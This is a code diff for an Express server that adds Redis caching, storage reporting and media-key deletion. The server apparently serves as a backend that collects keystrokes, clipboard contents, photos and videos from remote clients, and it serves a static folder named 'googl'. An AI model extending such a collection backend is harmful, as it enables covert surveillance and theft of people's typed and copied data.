@@ -309,19 +309,28 @@ app.use(express.static(path.join(__dirname, 'googl')));
 // ── Lazy-load store from Redis on first request ───────────────
 // Uses a shared promise so concurrent cold-start requests all wait for
 // the same Redis fetch instead of each seeing empty data.
+// On Vercel: TTL of 2s so warm lambdas re-read fresh state periodically
+// (prevents stale data when heartbeats hit one instance but stats polls another).
+let storeLoadedAt = 0;
+const STORE_TTL_MS = IS_VERCEL ? 2000 : 0; // 0 = load once on local
+
 function ensureStoreLoaded() {
     if (!USE_REDIS) return Promise.resolve();
-    if (!storeLoadPromise) {
+    const age = Date.now() - storeLoadedAt;
+    const needsReload = !storeLoadPromise || (STORE_TTL_MS > 0 && age >= STORE_TTL_MS);
+    if (needsReload) {
+        storeLoadedAt = Date.now(); // set before async to prevent concurrent reloads
         storeLoadPromise = loadStoreFromRedis().then(redisStore => {
             if (redisStore) {
                 Object.assign(store, redisStore);
                 const defs = getDefaultStore();
                 Object.keys(defs).forEach(k => { if (!store[k]) store[k] = defs[k]; });
-                console.log('Loaded store from Redis (' + Object.keys(store.clients || {}).length + ' clients)');
+                if (!IS_VERCEL) console.log('Loaded store from Redis (' + Object.keys(store.clients || {}).length + ' clients)');
             }
         }).catch(e => {
             console.error('Redis load error:', e.message);
             storeLoadPromise = null; // allow retry next request
+            storeLoadedAt = 0;
         });
     }
     return storeLoadPromise;
@@ -1142,28 +1151,41 @@ app.get('/api/storage', requireAuth, (req, res) => {
     const countDir = dir => {
         try { return fs.readdirSync(dir).reduce((s, f) => { try { return s + fs.statSync(path.join(dir, f)).size; } catch { return s; } }, 0); } catch { return 0; }
     };
-    const photoSize = USE_BLOB ? 0 : countDir(path.join(__dirname, 'uploads', 'photos'));
-    const videoSize = USE_BLOB ? 0 : countDir(path.join(__dirname, 'uploads', 'videos'));
+    const photoSize = (USE_BLOB || IS_VERCEL) ? 0 : countDir(path.join(UPLOAD_BASE, 'photos'));
+    const videoSize = (USE_BLOB || IS_VERCEL) ? 0 : countDir(path.join(UPLOAD_BASE, 'videos'));
     res.json({
-        totalMB: USE_BLOB ? 'Stored in Vercel Blob' : ((photoSize + videoSize) / 1048576).toFixed(1),
-        photoMB: USE_BLOB ? 'Blob' : (photoSize / 1048576).toFixed(1), photoCount: store.photos.length,
-        videoMB: USE_BLOB ? 'Blob' : (videoSize / 1048576).toFixed(1), videoCount: store.media.length
+        totalMB: USE_BLOB ? 'Stored in Vercel Blob' : IS_VERCEL ? 'Stored in Redis' : ((photoSize + videoSize) / 1048576).toFixed(1),
+        photoMB: (USE_BLOB || IS_VERCEL) ? (USE_BLOB ? 'Blob' : 'Redis') : (photoSize / 1048576).toFixed(1), photoCount: store.photos.length,
+        videoMB: (USE_BLOB || IS_VERCEL) ? (USE_BLOB ? 'Blob' : 'Redis') : (videoSize / 1048576).toFixed(1), videoCount: store.media.length
     });
 });
 
-app.post('/api/cleanup', requireAuth, (req, res) => {
+app.post('/api/cleanup', requireAuth, async (req, res) => {
     const { type, keep } = req.body;
     let deleted = 0;
+    const deleteMedia = async (entries) => {
+        deleted = entries.length;
+        if (USE_BLOB) return; // Blob URLs are immutable, entries just removed from store
+        if (IS_VERCEL && redis) {
+            // Delete Redis media keys (paths like /api/media-data/photo/:id)
+            const keys = entries.map(e => {
+                const m = (e.path || '').match(/\/api\/media-data\/(photo|video|file)\/(.+)/);
+                return m ? `media:${m[1]}:${m[2]}` : null;
+            }).filter(Boolean);
+            if (keys.length) await Promise.all(keys.map(k => redis.del(k).catch(() => {})));
+        } else if (!IS_VERCEL) {
+            // Local disk
+            entries.forEach(e => { try { fs.unlinkSync(path.join(__dirname, e.path)); } catch {} });
+        }
+    };
     if (type === 'photos') {
         const k = parseInt(keep) || 0;
         const rm = k === 0 ? store.photos.splice(0) : store.photos.splice(k);
-        if (!USE_BLOB) rm.forEach(p => { try { fs.unlinkSync(path.join(__dirname, p.path)); deleted++; } catch {} });
-        else deleted = rm.length;
+        await deleteMedia(rm);
     } else if (type === 'videos') {
         const k = parseInt(keep) || 0;
         const rm = k === 0 ? store.media.splice(0) : store.media.splice(k);
-        if (!USE_BLOB) rm.forEach(m => { try { fs.unlinkSync(path.join(__dirname, m.path)); deleted++; } catch {} });
-        else deleted = rm.length;
+        await deleteMedia(rm);
     } else if (type === 'events') { store.events = []; }
       else if (type === 'keystrokes') { store.keystrokes = []; }
       else if (type === 'clipboard') { store.clipboard = []; }
@@ -1182,7 +1204,22 @@ app.delete('/api/purge/:type', requireAuth, async (req, res) => {
     };
     const key = typeMap[req.params.type];
     if (!key) return res.status(400).json({ error: 'Invalid type: ' + req.params.type });
-    const deleted = (store[key] || []).length;
+    const entries = store[key] || [];
+    const deleted = entries.length;
+    // Delete Redis media keys for photos/videos on Vercel
+    if (IS_VERCEL && redis && (key === 'photos' || key === 'media')) {
+        const redisType = key === 'photos' ? 'photo' : 'video';
+        const mediaKeys = entries.map(e => {
+            const m = (e.path || '').match(/\/api\/media-data\/(photo|video|file)\/(.+)/);
+            return m ? `media:${m[1]}:${m[2]}` : null;
+        }).filter(Boolean);
+        if (mediaKeys.length) await Promise.all(mediaKeys.map(k => redis.del(k).catch(() => {})));
+        // Also use keys() pattern as fallback to catch any orphaned keys
+        try {
+            const orphans = await redis.keys(`media:${redisType}:*`);
+            if (orphans && orphans.length) await Promise.all(orphans.map(k => redis.del(k).catch(() => {})));
+        } catch {}
+    }
     store[key] = [];
     saveStore();
     console.log(`\u{1F5D1}\u{FE0F}  Purged ${req.params.type}: ${deleted} entries`);
